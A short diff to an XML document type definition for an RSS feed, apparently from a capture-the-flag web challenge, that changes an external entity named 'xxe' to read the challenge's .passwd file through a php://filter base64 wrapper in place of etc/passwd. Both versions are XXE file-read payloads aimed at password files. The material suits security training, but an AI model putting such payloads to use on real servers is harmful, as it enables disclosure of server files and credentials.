@@ -7,7 +7,7 @@
    <!ELEMENT link (#PCDATA)>
    <!ELEMENT description (#PCDATA)>
    <!ELEMENT item (title, link, description)>
-   <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///challenge/web-serveur/ch29/etc/passwd" >
+   <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///challenge/web-serveur/ch29/.passwd" >
 ]>
 
 <rss version="2.0">
